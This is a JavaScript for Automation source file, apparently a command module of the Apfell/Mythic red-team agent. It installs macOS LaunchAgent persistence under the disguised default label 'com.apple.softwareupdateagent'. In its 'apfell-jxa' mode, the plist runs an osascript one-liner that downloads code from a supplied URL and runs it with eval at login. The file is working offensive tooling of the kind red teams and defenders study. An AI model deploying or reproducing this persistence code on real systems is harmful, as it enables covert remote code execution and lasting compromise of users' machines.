exports.persist_launch = function(task, command, params){
    try{
        let config = JSON.parse(params);
        let template = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" +
                "<plist version=\"1.0\">\n" +
                "<dict>\n" +
                "<key>Label</key>\n";
        let label = "com.apple.softwareupdateagent";
        if(config.hasOwnProperty('label') && config['label'] !== ""){label = config['label'];}
        template += "<string>" + label + "</string>\n";
        template += "<key>ProgramArguments</key><array>\n";
        if(config.hasOwnProperty('args') && config['args'].length > 0){
            if(config['args'][0] === "apfell-jxa"){
                // we'll add in an apfell-jxa one liner to run
                template += "<string>/usr/bin/osascript</string>\n" +
                "<string>-l</string>\n" +
                "<string>JavaScript</string>\n" +
                "<string>-e</string>\n" +
                "<string>eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('" +
                config['args'][1] + "')),$.NSUTF8StringEncoding)))</string>\n"
            }
            else{
                for(let i = 0; i < config['args'].length; i++){
                    template += "<string>" + config['args'][i] + "</string>\n";
                }
            }
        }
        else{
            return {"user_output": "Program args needs values for \"apfell-jxa\"", "completed": true, "status": "error"};
        }
        template += "</array>\n";
        if(config.hasOwnProperty('KeepAlive') && config['KeepAlive'] === true){ template += "<key>KeepAlive</key>\n<true/>\n"; }
        if(config.hasOwnProperty('RunAtLoad') && config['RunAtLoad'] === true){ template += "<key>RunAtLoad</key>\n<true/>\n"; }
        template += "</dict>\n</plist>\n"
        // now we need to actually write out the plist to disk
        let response = "";
        let output = {"user_output":response, "completed": true};
        if(config.hasOwnProperty('LocalAgent') && config['LocalAgent'] === true){
            let path = "~/Library/LaunchAgents/";
            path = $(path).stringByExpandingTildeInPath;
            var fileManager = $.NSFileManager.defaultManager;
            if(!fileManager.fileExistsAtPath(path)){
                $.fileManager.createDirectoryAtPathWithIntermediateDirectoriesAttributesError(path, false, $(), $());
            }
            path = $(path.js + "/" + label + ".plist");
            response = write_data_to_file(template, path);
            output["artifacts"] =  [{"base_artifact": "File Create", "artifact": path}];
        }
        else if(config.hasOwnProperty('LaunchPath') && config['LaunchPath'] !== ""){
            response = write_data_to_file(template, $(config['LaunchPath']));
            output["artifacts"] =  [{"base_artifact": "File Create", "artifact": config["LaunchPath"]}];
        }
        output["user_output"] = response;
        return output;

    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};
